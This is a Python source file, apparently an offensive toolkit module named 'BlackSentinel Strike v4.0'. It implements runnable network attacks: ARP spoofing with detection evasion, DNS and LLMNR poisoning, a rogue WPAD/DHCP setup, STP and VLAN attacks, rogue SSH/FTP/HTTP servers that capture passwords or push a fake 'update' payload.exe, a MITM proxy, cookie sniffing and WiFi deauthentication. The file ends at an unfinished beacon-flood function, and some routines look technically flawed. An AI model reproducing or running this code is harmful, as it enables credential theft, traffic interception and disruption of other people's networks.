#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════
        NETWORK ATTACKS MODULE - BlackSentinel Strike v4.0
═══════════════════════════════════════════════════════════════
"""

import subprocess
import socket
import threading
import time
import platform
import tempfile
import os
import random
import json
from datetime import datetime

try:
    from scapy.all import (
        Ether,
        ARP,
        IP,
        UDP,
        DNS,
        DNSRR,
        Raw,
        send,
        sendp,
        sniff,
        get_if_list,
        IPv6,
        ICMPv6ND_RS,
        ICMPv6ND_RA,
        ICMPv6NDOptDstLLAddr,
        Dot1Q,
        LLC,
        STP,
        DHCP,
        BOOTP,
    )

    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class NetworkAttackModule:
    """Advanced Network Attack Module"""

    def __init__(self, callback=None):
        self.callback = callback
        self.results = {}
        self.is_running = False
        self._threads = []
        self._lock = threading.Lock()
        self._attack_start_time = None
        self._captured_credentials = []
        self._captured_packets = []

    def log(self, message, level="info"):
        """Log message via callback"""
        if self.callback:
            self.callback(message, level)

    def run_command(self, cmd, timeout=30):
        """Execute a shell command and return stdout"""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            self.log(f"Command timed out after {timeout}s", "warning")
            return None
        except Exception as e:
            self.log(f"Command failed: {e}", "error")
            return None

    def _require_scapy(self, method_name):
        """Guard that raises early if scapy is missing"""
        if not SCAPY_AVAILABLE:
            msg = f"scapy is not installed – {method_name} unavailable"
            self.log(msg, "error")
            raise ImportError(msg)

    def _get_default_interface(self):
        """Detect the default network interface"""
        try:
            ifaces = get_if_list()
            for iface in ifaces:
                if iface not in ("lo", "lo0"):
                    return iface
        except Exception:
            pass
        if platform.system() == "Darwin":
            return "en0"
        return "eth0"

    def _random_mac(self):
        """Generate a random locally-administered MAC address"""
        mac = [
            0x02,
            random.randint(0x00, 0x7F),
            random.randint(0x00, 0xFF),
            random.randint(0x00, 0xFF),
            random.randint(0x00, 0xFF),
            random.randint(0x00, 0xFF),
        ]
        return ":".join(f"{b:02x}" for b in mac)

    # ──────────────────────────────────────────────────────────
    #  1. ARP Spoofing Advanced
    # ──────────────────────────────────────────────────────────
    def arp_spoofing_advanced(self, target, gateway, interface=None):
        """Advanced ARP spoofing with rate limiting and detection avoidance."""
        self._require_scapy("arp_spoofing_advanced")
        self.log(f"[ARP-ADV] Starting advanced ARP spoofing: {target} <-> {gateway}", "warning")
        self.is_running = True
        if interface is None:
            interface = self._get_default_interface()

        self._enable_ip_forward()

        sent_count = 0
        interval = random.uniform(2.0, 5.0)

        def _send_arp_loop():
            nonlocal sent_count
            self.log(f"[ARP-ADV] Spoofing loop started (interval ~{interval:.1f}s)", "info")
            while self.is_running:
                try:
                    pkt_to_target = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                        op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway
                    )
                    pkt_to_gateway = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                        op=2, pdst=gateway, hwdst="ff:ff:ff:ff:ff:ff", psrc=target
                    )
                    send(pkt_to_target, iface=interface, verbose=False)
                    send(pkt_to_gateway, iface=interface, verbose=False)
                    sent_count += 2
                    jitter = random.uniform(-0.5, 0.5)
                    time.sleep(max(0.5, interval + jitter))
                except Exception as e:
                    self.log(f"[ARP-ADV] Send error: {e}", "error")
                    time.sleep(2)

        thread = threading.Thread(target=_send_arp_loop, daemon=True)
        thread.start()
        self._threads.append(thread)

        self.log("[ARP-ADV] Advanced ARP spoofing active", "success")
        result = {
            "status": "active",
            "target": target,
            "gateway": gateway,
            "interface": interface,
            "packets_sent": sent_count,
            "detection_avoidance": "rate-limiting + jitter",
        }
        with self._lock:
            self.results["arp_spoofing_advanced"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  2. DNS Poisoning
    # ──────────────────────────────────────────────────────────
    def dns_poisoning(self, target, fake_ip, domain):
        """DNS spoofing / poisoning – replies to DNS queries for *domain* with *fake_ip*."""
        self._require_scapy("dns_poisoning")
        self.log(f"[DNS] Poisoning {domain} -> {fake_ip} for target {target}", "warning")
        self.is_running = True
        interface = self._get_default_interface()

        self._enable_ip_forward()

        def _dns_responder():
            self.log("[DNS] Listening for DNS queries…", "info")
            while self.is_running:
                try:
                    pkts = sniff(
                        filter=f"udp port 53 and src host {target}",
                        iface=interface,
                        count=1,
                        timeout=3,
                    )
                    for pkt in pkts:
                        if DNS in pkt and pkt[DNS].qr == 0:
                            qname = pkt[DNS].qd.qname.decode().rstrip(".")
                            if qname == domain or domain in qname:
                                spoofed = (
                                    Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
                                    / IP(src=pkt[IP].dst, dst=pkt[IP].src)
                                    / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                                    / DNS(
                                        id=pkt[DNS].id,
                                        qr=1,
                                        qd=pkt[DNS].qd,
                                        an=DNSRR(rrname=qname, rdata=fake_ip),
                                    )
                                )
                                sendp(spoofed, iface=interface, verbose=False)
                                self.log(f"[DNS] Spoofed response: {qname} -> {fake_ip}", "success")
                except Exception:
                    time.sleep(0.5)

        thread = threading.Thread(target=_dns_responder, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {
            "status": "active",
            "target": target,
            "domain": domain,
            "fake_ip": fake_ip,
            "interface": interface,
        }
        with self._lock:
            self.results["dns_poisoning"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  3. LLMNR / NBT-NS Poisoning
    # ──────────────────────────────────────────────────────────
    def llmnr_nbtns_poisoning(self):
        """LLMNR/NBT-NS poisoning for credential capture on the local LAN."""
        self._require_scapy("llmnr_nbtns_poisoning")
        self.log("[LLMNR] Starting LLMNR/NBT-NS poisoning", "warning")
        self.is_running = True
        interface = self._get_default_interface()

        def _responder():
            self.log("[LLMNR] Listening for LLMNR (5355) and NBT-NS (137) queries…", "info")
            while self.is_running:
                try:
                    pkts = sniff(
                        filter="udp port 5355 or udp port 137",
                        iface=interface,
                        count=1,
                        timeout=3,
                    )
                    for pkt in pkts:
                        if DNS in pkt and pkt[DNS].qr == 0:
                            qname = pkt[DNS].qd.qname.decode().rstrip(".")
                            my_ip = self._get_local_ip(interface)
                            resp = (
                                Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
                                / IP(src=pkt[IP].dst, dst=pkt[IP].src)
                                / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                                / DNS(
                                    id=pkt[DNS].id,
                                    qr=1,
                                    qd=pkt[DNS].qd,
                                    an=DNSRR(rrname=qname, rdata=my_ip),
                                )
                            )
                            sendp(resp, iface=interface, verbose=False)
                            self.log(f"[LLMNR] Poisoned response for {qname}", "success")
                            with self._lock:
                                self.results.setdefault("llmnr_nbtns_captures", []).append(
                                    {
                                        "name": qname,
                                        "resolved_to": my_ip,
                                        "timestamp": datetime.now().isoformat(),
                                    }
                                )
                except Exception:
                    time.sleep(0.5)

        thread = threading.Thread(target=_responder, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {"status": "active", "interface": interface, "captures": []}
        with self._lock:
            self.results["llmnr_nbtns_poisoning"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  4. WPAD Attack
    # ──────────────────────────────────────────────────────────
    def wpad_attack(self):
        """WPAD proxy auto-discovery attack – serves a malicious PAC file."""
        self.log("[WPAD] Starting WPAD attack", "warning")
        self.is_running = True
        interface = self._get_default_interface()
        wpad_port = 80

        pac_content = (
            'function FindProxyForURL(url, host) {\n  return "PROXY %(proxy_ip)s:%(proxy_port)s; DIRECT";\n}\n'
        )

        my_ip = self._get_local_ip(interface)
        proxy_port = 8080
        pac_file = pac_content % {"proxy_ip": my_ip, "proxy_port": proxy_port}

        tmp_dir = tempfile.gettempdir()
        pac_path = os.path.join(tmp_dir, "wpad.dat")
        with open(pac_path, "w") as f:
            f.write(pac_file)

        def _serve_pac():
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(("0.0.0.0", wpad_port))
                srv.listen(5)
                srv.settimeout(3)
                self.log(f"[WPAD] PAC server on port {wpad_port}", "info")
                while self.is_running:
                    try:
                        conn, addr = srv.accept()
                        data = conn.recv(1024).decode(errors="ignore")
                        if "wpad.dat" in data or "WPAD" in data:
                            response = (
                                "HTTP/1.1 200 OK\r\n"
                                "Content-Type: application/x-ns-proxy-autoconfig\r\n"
                                f"Content-Length: {len(pac_file)}\r\n\r\n" + pac_file
                            )
                            conn.sendall(response.encode())
                            self.log(f"[WPAD] PAC served to {addr[0]}", "success")
                        conn.close()
                    except socket.timeout:
                        continue
                srv.close()
            except Exception as e:
                self.log(f"[WPAD] Server error: {e}", "error")

        thread = threading.Thread(target=_serve_pac, daemon=True)
        thread.start()
        self._threads.append(thread)

        # Optionally poison WPAD lookup via LLMNR/DNS
        self.log("[WPAD] Consider running LLMNR poisoning to redirect WPAD queries", "info")

        result = {
            "status": "active",
            "pac_url": f"http://{my_ip}:{wpad_port}/wpad.dat",
            "proxy_redirect": f"{my_ip}:{proxy_port}",
            "interface": interface,
        }
        with self._lock:
            self.results["wpad_attack"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  5. DHCP Starvation
    # ──────────────────────────────────────────────────────────
    def dhcp_starvation(self, interface=None):
        """DHCP starvation – exhaust the DHCP pool by requesting IPs with random MACs."""
        self._require_scapy("dhcp_starvation")
        if interface is None:
            interface = self._get_default_interface()
        self.log(f"[DHCP-STV] Starting DHCP starvation on {interface}", "warning")
        self.is_running = True
        sent_count = 0

        def _starve():
            nonlocal sent_count
            self.log("[DHCP-STV] Sending DHCP DISCOVER flood…", "info")
            while self.is_running:
                try:
                    mac = self._random_mac()
                    xid = random.randint(0, 0xFFFFFFFF)
                    pkt = (
                        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
                        / IP(src="0.0.0.0", dst="255.255.255.255")
                        / UDP(sport=68, dport=67)
                        / BOOTP(
                            op=1,
                            htype=1,
                            hlen=6,
                            xid=xid,
                            chaddr=bytes.fromhex(mac.replace(":", "")),
                        )
                        / DHCP(options=[("message-type", "discover"), ("end",)])
                    )
                    sendp(pkt, iface=interface, verbose=False)
                    sent_count += 1
                    time.sleep(random.uniform(0.05, 0.2))
                except Exception as e:
                    self.log(f"[DHCP-STV] Error: {e}", "error")
                    time.sleep(1)

        thread = threading.Thread(target=_starve, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {
            "status": "active",
            "interface": interface,
            "requests_sent": sent_count,
        }
        with self._lock:
            self.results["dhcp_starvation"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  6. DHCP Spoofing (Rogue DHCP)
    # ──────────────────────────────────────────────────────────
    def dhcp_spoofing(self, interface=None):
        """Rogue DHCP server – offers malicious network config to clients."""
        if interface is None:
            interface = self._get_default_interface()
        self.log(f"[DHCP-R] Starting rogue DHCP server on {interface}", "warning")
        self.is_running = True
        my_ip = self._get_local_ip(interface)

        # dnsmasq-based rogue DHCP
        tmp_dir = tempfile.gettempdir()
        dnsmasq_conf = os.path.join(tmp_dir, "rogue_dhcp.conf")
        dnsmasq_leases = os.path.join(tmp_dir, "rogue_dhcp.leases")

        config = (
            f"interface={interface}\n"
            f"dhcp-range=192.168.100.100,192.168.100.200,255.255.255.0,12h\n"
            f"dhcp-option=3,{my_ip}\n"
            f"dhcp-option=6,{my_ip}\n"
            f"dhcp-authoritative\n"
            f"log-dhcp\n"
            f"dhcp-leasefile={dnsmasq_leases}\n"
        )
        with open(dnsmasq_conf, "w") as f:
            f.write(config)

        def _run_dhcp():
            cmd = f"sudo dnsmasq -C {dnsmasq_conf} --no-daemon"
            self.run_command(cmd, timeout=600)

        thread = threading.Thread(target=_run_dhcp, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {
            "status": "active",
            "interface": interface,
            "dhcp_range": "192.168.100.100-200",
            "gateway": my_ip,
            "dns": my_ip,
            "config_file": dnsmasq_conf,
        }
        with self._lock:
            self.results["dhcp_spoofing"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  7. VLAN Hopping (Double Tagging)
    # ──────────────────────────────────────────────────────────
    def vlan_hopping(self, native_vlan=1):
        """Double-tagging VLAN hop attack."""
        self._require_scapy("vlan_hopping")
        if platform.system() != "Linux":
            self.log("[VLAN] Double tagging requires Linux", "error")
            return {"status": "error", "message": "Linux only"}
        self.log(f"[VLAN] Starting VLAN hopping (native={native_vlan})", "warning")
        self.is_running = True
        interface = self._get_default_interface()
        target_vlan = 100

        def _double_tag():
            self.log("[VLAN] Sending double-tagged frames…", "info")
            count = 0
            while self.is_running:
                try:
                    pkt = (
                        Ether(dst="ff:ff:ff:ff:ff:ff")
                        / Dot1Q(vlan=native_vlan)
                        / Dot1Q(vlan=target_vlan)
                        / IP(dst="255.255.255.255")
                        / UDP(sport=67, dport=68)
                        / Raw(load=b"\x00" * 64)
                    )
                    sendp(pkt, iface=interface, verbose=False)
                    count += 1
                    time.sleep(0.5)
                except Exception as e:
                    self.log(f"[VLAN] Error: {e}", "error")
                    time.sleep(1)

        thread = threading.Thread(target=_double_tag, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {
            "status": "active",
            "native_vlan": native_vlan,
            "target_vlan": target_vlan,
            "interface": interface,
        }
        with self._lock:
            self.results["vlan_hopping"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  8. STP Attack
    # ──────────────────────────────────────────────────────────
    def stp_attack(self, interface=None):
        """Spanning Tree Protocol manipulation – become the root bridge."""
        self._require_scapy("stp_attack")
        if interface is None:
            interface = self._get_default_interface()
        self.log(f"[STP] Injecting superior BPDUs on {interface}", "warning")
        self.is_running = True

        my_mac = self._random_mac()

        def _stp_inject():
            self.log("[STP] Sending BPDU with low root path cost…", "info")
            while self.is_running:
                try:
                    bpdu = (
                        Ether(src=my_mac, dst="01:80:c2:00:00:00", type=0x0000)
                        / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
                        / STP(
                            rootid=0,
                            rootmac=my_mac,
                            rootpathcost=0,
                            bridgeid=0,
                            bridgemac=my_mac,
                            portid=0x8001,
                            msgage=0,
                            maxage=20,
                            fwddelay=15,
                            flags=0x3C,
                        )
                    )
                    sendp(bpdu, iface=interface, verbose=False)
                    time.sleep(2)
                except Exception as e:
                    self.log(f"[STP] Error: {e}", "error")
                    time.sleep(2)

        thread = threading.Thread(target=_stp_inject, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {
            "status": "active",
            "spoofed_bridge_mac": my_mac,
            "interface": interface,
        }
        with self._lock:
            self.results["stp_attack"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  9. CDP / LLDP Spoof
    # ──────────────────────────────────────────────────────────
    def cdp_lldp_spoof(self):
        """Inject forged CDP/LLDP frames to impersonate a network device."""
        self._require_scapy("cdp_lldp_spoof")
        self.log("[CDP] Starting CDP/LLDP spoofing", "warning")
        self.is_running = True
        interface = self._get_default_interface()

        def _inject():
            while self.is_running:
                try:
                    # Forged CDP-like frame
                    cdp_payload = (
                        b"\x01"  # version
                        b"\x00\x0c"  # TTL
                        + b"\x00\x05"
                        + b"Switch"  # device-id TLV
                        + b"\x00\x03"
                        + b"Gi0/1"  # port-id TLV
                        + b"\x00\x04"
                        + b"\x01"  # capabilities
                    )
                    pkt = Ether(dst="01:00:0c:cc:cc:cc", src=self._random_mac(), type=0x2000) / Raw(load=cdp_payload)
                    sendp(pkt, iface=interface, verbose=False)

                    # LLDP-like frame
                    lldp_payload = (
                        b"\x02\x07"
                        + b"sw-core"  # chassis ID
                        + b"\x04\x07"
                        + b"Gi0/1"  # port ID
                        + b"\x06\x02"
                        + b"\x00\x78"  # TTL 120
                        + b"\x08\x05"
                        + b"Switch"  # sys name
                        + b"\x00\x00"  # end
                    )
                    pkt2 = Ether(dst="01:80:c2:00:00:0e", src=self._random_mac(), type=0x88CC) / Raw(load=lldp_payload)
                    sendp(pkt2, iface=interface, verbose=False)
                    self.log("[CDP] Forged CDP+LLDP frames sent", "success")
                    time.sleep(5)
                except Exception as e:
                    self.log(f"[CDP] Error: {e}", "error")
                    time.sleep(3)

        thread = threading.Thread(target=_inject, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {"status": "active", "interface": interface, "spoofed_identity": "Switch"}
        with self._lock:
            self.results["cdp_lldp_spoof"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  10. IPv6 Router Advertisement
    # ──────────────────────────────────────────────────────────
    def ipv6_router_advertisement(self, interface=None):
        """IPv6 RA attack – advertise a rogue router to hijack IPv6 traffic."""
        self._require_scapy("ipv6_router_advertisement")
        if interface is None:
            interface = self._get_default_interface()
        self.log(f"[IPv6-RA] Sending rogue RA on {interface}", "warning")
        self.is_running = True

        def _send_ra():
            src_mac = self._random_mac()
            while self.is_running:
                try:
                    pkt = (
                        Ether(src=src_mac, dst="33:33:00:00:00:01")
                        / IPv6(src="fe80::1", dst="ff02::1")
                        / ICMPv6ND_RA()
                        / ICMPv6NDOptDstLLAddr(lladdr=src_mac)
                    )
                    sendp(pkt, iface=interface, verbose=False)
                    self.log("[IPv6-RA] Rogue RA sent", "success")
                    time.sleep(random.uniform(3, 7))
                except Exception as e:
                    self.log(f"[IPv6-RA] Error: {e}", "error")
                    time.sleep(3)

        thread = threading.Thread(target=_send_ra, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {"status": "active", "interface": interface, "rogue_router_ip": "fe80::1"}
        with self._lock:
            self.results["ipv6_router_advertisement"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  11. NDP Spoofing
    # ──────────────────────────────────────────────────────────
    def ndp_spoofing(self, target):
        """NDP spoofing – reply to Neighbor Solicitation with a fake mapping."""
        self._require_scapy("ndp_spoofing")
        self.log(f"[NDP] Spoofing NDP for {target}", "warning")
        self.is_running = True
        interface = self._get_default_interface()

        def _ndp_responder():
            self.log("[NDP] Listening for Neighbor Solicitation…", "info")
            while self.is_running:
                try:
                    pkts = sniff(
                        filter="ip6 and icmp6 type 135",
                        iface=interface,
                        count=1,
                        timeout=3,
                    )
                    for pkt in pkts:
                        if ICMPv6ND_RS in pkt:
                            ns_target = pkt[ICMPv6ND_RS].tgt
                            if str(ns_target) == str(target):
                                src_mac = self._random_mac()
                                resp = (
                                    Ether(src=src_mac, dst=pkt[Ether].src)
                                    / IPv6(src=str(ns_target), dst=str(pkt[IPv6].src))
                                    / ICMPv6ND_RA()
                                    / ICMPv6NDOptDstLLAddr(lladdr=src_mac)
                                )
                                sendp(resp, iface=interface, verbose=False)
                                self.log(f"[NDP] Spoofed NA for {target}", "success")
                except Exception:
                    time.sleep(0.5)

        thread = threading.Thread(target=_ndp_responder, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {"status": "active", "target": target, "interface": interface}
        with self._lock:
            self.results["ndp_spoofing"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  12. Rogue SSH Server
    # ──────────────────────────────────────────────────────────
    def rogue_ssh_server(self, port=22):
        """Rogue SSH server that captures credentials from connection attempts."""
        self.log(f"[SSH-R] Starting rogue SSH server on port {port}", "warning")
        self.is_running = True

        def _run_server():
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(("0.0.0.0", port))
                srv.listen(5)
                srv.settimeout(3)
                self.log(f"[SSH-R] Listening on port {port}", "info")

                while self.is_running:
                    try:
                        conn, addr = srv.accept()
                        self.log(f"[SSH-R] Connection from {addr[0]}:{addr[1]}", "info")
                        banner = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4\r\n"
                        conn.sendall(banner)
                        data = conn.recv(4096)
                        if data:
                            entry = {
                                "source": f"{addr[0]}:{addr[1]}",
                                "data_hex": data.hex(),
                                "data_ascii": data.decode(errors="replace"),
                                "timestamp": datetime.now().isoformat(),
                            }
                            with self._lock:
                                self._captured_credentials.append(entry)
                                self.results.setdefault("ssh_captures", []).append(entry)
                            self.log(f"[SSH-R] Captured {len(data)} bytes from {addr[0]}", "success")
                        conn.close()
                    except socket.timeout:
                        continue
                    except Exception as e:
                        self.log(f"[SSH-R] Conn error: {e}", "error")
                srv.close()
            except Exception as e:
                self.log(f"[SSH-R] Server error: {e}", "error")

        thread = threading.Thread(target=_run_server, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {"status": "active", "port": port, "captures": []}
        with self._lock:
            self.results["rogue_ssh_server"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  13. Rogue FTP Server
    # ──────────────────────────────────────────────────────────
    def rogue_ftp_server(self, port=21):
        """Rogue FTP server to capture credentials and file transfers."""
        self.log(f"[FTP-R] Starting rogue FTP server on port {port}", "warning")
        self.is_running = True

        def _run_server():
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(("0.0.0.0", port))
                srv.listen(5)
                srv.settimeout(3)
                self.log(f"[FTP-R] Listening on port {port}", "info")

                while self.is_running:
                    try:
                        conn, addr = srv.accept()
                        self.log(f"[FTP-R] Connection from {addr[0]}", "info")
                        conn.sendall(b"220 BlackSentinel FTP Server Ready\r\n")
                        logged_in = False
                        username = None
                        while self.is_running:
                            data = conn.recv(1024)
                            if not data:
                                break
                            line = data.decode(errors="replace").strip()
                            cmd_upper = line.upper().split()[0] if line else ""
                            if cmd_upper == "USER":
                                username = line.split(None, 1)[1] if len(line.split()) > 1 else ""
                                conn.sendall(b"331 Password required\r\n")
                            elif cmd_upper == "PASS":
                                password = line.split(None, 1)[1] if len(line.split()) > 1 else ""
                                entry = {
                                    "source": f"{addr[0]}:{addr[1]}",
                                    "username": username,
                                    "password": password,
                                    "timestamp": datetime.now().isoformat(),
                                }
                                with self._lock:
                                    self._captured_credentials.append(entry)
                                    self.results.setdefault("ftp_captures", []).append(entry)
                                self.log(f"[FTP-R] Captured: {username}:{password}", "success")
                                conn.sendall(b"230 Login successful\r\n")
                                logged_in = True
                            elif cmd_upper == "QUIT":
                                conn.sendall(b"221 Goodbye\r\n")
                                break
                            else:
                                conn.sendall(b"200 OK\r\n")
                        conn.close()
                    except socket.timeout:
                        continue
                    except Exception as e:
                        self.log(f"[FTP-R] Conn error: {e}", "error")
                srv.close()
            except Exception as e:
                self.log(f"[FTP-R] Server error: {e}", "error")

        thread = threading.Thread(target=_run_server, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {"status": "active", "port": port, "captures": []}
        with self._lock:
            self.results["rogue_ftp_server"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  14. Rogue HTTP Server
    # ──────────────────────────────────────────────────────────
    def rogue_http_server(self, port=8080):
        """Rogue HTTP server – serves payloads and captures client info."""
        self.log(f"[HTTP-R] Starting rogue HTTP server on port {port}", "warning")
        self.is_running = True

        PAYLOAD_HTML = (
            "<html><head><title>Update Required</title></head>"
            "<body><h1>System Update Required</h1>"
            "<p>Your browser will redirect automatically…</p>"
            "<script>window.location.href='http://{ip}:{port}/payload.exe';</script>"
            "</body></html>"
        )

        def _run_server():
            my_ip = self._get_local_ip(self._get_default_interface())
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(("0.0.0.0", port))
                srv.listen(5)
                srv.settimeout(3)
                self.log(f"[HTTP-R] Listening on port {port}", "info")

                while self.is_running:
                    try:
                        conn, addr = srv.accept()
                        data = conn.recv(4096).decode(errors="replace")
                        if data:
                            request_line = data.split("\r\n")[0]
                            path = request_line.split(" ")[1] if len(request_line.split()) > 1 else "/"
                            ua = ""
                            for line in data.split("\r\n"):
                                if line.lower().startswith("user-agent:"):
                                    ua = line.split(":", 1)[1].strip()
                            entry = {
                                "source": f"{addr[0]}:{addr[1]}",
                                "path": path,
                                "user_agent": ua,
                                "timestamp": datetime.now().isoformat(),
                            }
                            with self._lock:
                                self.results.setdefault("http_captures", []).append(entry)
                            self.log(f"[HTTP-R] Request from {addr[0]}: {path}", "success")

                            body = PAYLOAD_HTML.format(ip=my_ip, port=port)
                            response = (
                                "HTTP/1.1 200 OK\r\n"
                                "Content-Type: text/html\r\n"
                                f"Content-Length: {len(body)}\r\n\r\n" + body
                            )
                            conn.sendall(response.encode())
                        conn.close()
                    except socket.timeout:
                        continue
                    except Exception as e:
                        self.log(f"[HTTP-R] Error: {e}", "error")
                srv.close()
            except Exception as e:
                self.log(f"[HTTP-R] Server error: {e}", "error")

        thread = threading.Thread(target=_run_server, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {"status": "active", "port": port, "captures": []}
        with self._lock:
            self.results["rogue_http_server"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  15. MITM Proxy
    # ──────────────────────────────────────────────────────────
    def mitm_proxy(self, target, port=8080):
        """Transparent MITM proxy – intercept and log HTTP traffic."""
        self.log(f"[MITM-P] Starting MITM proxy for {target} on port {port}", "warning")
        self.is_running = True

        def _proxy():
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(("0.0.0.0", port))
                srv.listen(10)
                srv.settimeout(3)
                self.log(f"[MITM-P] Proxy listening on port {port}", "info")

                while self.is_running:
                    try:
                        client_conn, client_addr = srv.accept()
                        threading.Thread(
                            target=_handle_proxy_conn,
                            args=(client_conn, client_addr, target),
                            daemon=True,
                        ).start()
                    except socket.timeout:
                        continue
                srv.close()
            except Exception as e:
                self.log(f"[MITM-P] Server error: {e}", "error")

        def _handle_proxy_conn(client_conn, client_addr, target_host):
            try:
                data = client_conn.recv(8192)
                if not data:
                    client_conn.close()
                    return
                header = data.split(b"\r\n")[0].decode(errors="replace")
                entry = {
                    "source": f"{client_addr[0]}:{client_addr[1]}",
                    "header": header,
                    "size": len(data),
                    "timestamp": datetime.now().isoformat(),
                }
                with self._lock:
                    self.results.setdefault("mitm_proxy_captures", []).append(entry)
                self.log(f"[MITM-P] Intercepted {len(data)} bytes from {client_addr[0]}", "success")

                # Forward to real target
                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote.settimeout(10)
                remote.connect((target_host, 80))
                remote.sendall(data)
                response = remote.recv(8192)
                remote.close()
                client_conn.sendall(response)
            except Exception as e:
                self.log(f"[MITM-P] Forward error: {e}", "error")
            finally:
                client_conn.close()

        thread = threading.Thread(target=_proxy, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {"status": "active", "target": target, "port": port}
        with self._lock:
            self.results["mitm_proxy"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  16. Session Hijacking
    # ──────────────────────────────────────────────────────────
    def session_hijacking(self, target):
        """HTTP session hijacking – sniff and extract session cookies from traffic."""
        self._require_scapy("session_hijacking")
        self.log(f"[SESS] Sniffing HTTP sessions for {target}", "warning")
        self.is_running = True
        interface = self._get_default_interface()

        self._enable_ip_forward()

        def _sniff_sessions():
            self.log("[SESS] Listening for HTTP traffic…", "info")
            while self.is_running:
                try:
                    pkts = sniff(
                        filter=f"tcp port 80 and host {target}",
                        iface=interface,
                        count=1,
                        timeout=5,
                    )
                    for pkt in pkts:
                        if Raw in pkt:
                            payload = pkt[Raw].load.decode(errors="replace")
                            cookies = []
                            for line in payload.split("\r\n"):
                                lower = line.lower()
                                if lower.startswith("cookie:"):
                                    cookies.append(line.split(":", 1)[1].strip())
                                elif lower.startswith("set-cookie:"):
                                    cookies.append(line.split(":", 1)[1].strip())
                            if cookies:
                                entry = {
                                    "source": str(pkt[IP].src),
                                    "destination": str(pkt[IP].dst),
                                    "cookies": cookies,
                                    "timestamp": datetime.now().isoformat(),
                                }
                                with self._lock:
                                    self.results.setdefault("session_hijack_captures", []).append(entry)
                                self.log(f"[SESS] Captured {len(cookies)} cookie(s)", "success")
                except Exception:
                    time.sleep(0.5)

        thread = threading.Thread(target=_sniff_sessions, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {"status": "active", "target": target, "interface": interface, "captures": []}
        with self._lock:
            self.results["session_hijacking"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  17. WiFi Deauth
    # ──────────────────────────────────────────────────────────
    def wifi_deauth(self, bssid, channel):
        """WiFi deauthentication attack."""
        self.log(f"[WiFi-DEAUTH] Deauthing BSSID {bssid} on ch{channel}", "warning")
        self.is_running = True
        interface = self._get_default_interface()
        count = 0

        def _deauth_loop():
            nonlocal count
            # Try to set channel
            if platform.system() == "Darwin":
                self.run_command(f"airport --channel={channel}")
            else:
                self.run_command(f"iwconfig {interface} channel {channel}")
            self.log("[WiFi-DEAUTH] Sending deauth frames…", "info")
            while self.is_running:
                try:
                    deauth = Ether(dst=bssid, src="ff:ff:ff:ff:ff:ff") / Raw(
                        load=b"\x00\x03\x00\x00\x00" + bytes.fromhex(bssid.replace(":", "")) * 2 + b"\x00\x07"
                    )
                    sendp(deauth, iface=interface, verbose=False)
                    count += 1
                    time.sleep(0.1)
                except Exception as e:
                    self.log(f"[WiFi-DEAUTH] Error: {e}", "error")
                    time.sleep(1)

        thread = threading.Thread(target=_deauth_loop, daemon=True)
        thread.start()
        self._threads.append(thread)

        result = {
            "status": "active",
            "bssid": bssid,
            "channel": channel,
            "packets_sent": count,
        }
        with self._lock:
            self.results["wifi_deauth"] = result
        return result

    # ──────────────────────────────────────────────────────────
    #  18. WiFi Beacon Flood
    # ──────────────────────────────────────────────────────────
    def wifi_beacon_flood(self, ssid):
        """WiFi beacon frame flooding – flood area with fake SSIDs."""
